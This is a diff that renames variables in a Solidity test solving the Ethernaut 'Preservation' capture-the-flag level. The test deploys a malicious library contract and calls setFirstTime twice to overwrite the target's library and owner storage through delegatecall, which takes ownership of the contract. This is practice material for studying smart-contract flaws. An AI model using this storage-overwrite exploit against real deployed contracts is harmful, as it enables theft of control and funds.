@@ -12,7 +12,7 @@ contract PreservationTest is DSTest {
     Ethernaut ethernaut;
     PreservationFactory preservationFactory;
     Vm private constant vm = Vm(HEVM_ADDRESS);
-    address eoaAddress = address(69);
+    address eoa = address(69);
 
     function setUp() public {
         ethernaut = new Ethernaut();
@@ -21,21 +21,19 @@ contract PreservationTest is DSTest {
     }
 
     function testIsPreservationCleared() public {
-        vm.startPrank(eoaAddress);
-        address instanceAddress = ethernaut.createLevelInstance(
-            preservationFactory
-        );
-        Preservation preservation = Preservation(instanceAddress);
+        vm.startPrank(eoa);
+        address instance = ethernaut.createLevelInstance(preservationFactory);
+        Preservation preservation = Preservation(instance);
 
         MaliciousLibraryContract maliciousLibraryContract = new MaliciousLibraryContract();
 
         uint256 timeStamp = uint256(uint160(address(maliciousLibraryContract)));
         preservation.setFirstTime(timeStamp);
 
-        timeStamp = uint256(uint160(eoaAddress));
+        timeStamp = uint256(uint160(eoa));
         preservation.setFirstTime(timeStamp);
 
-        assertTrue(ethernaut.submitLevelInstance(payable(instanceAddress)));
+        assertTrue(ethernaut.submitLevelInstance(payable(instance)));
 
         vm.stopPrank();
     }
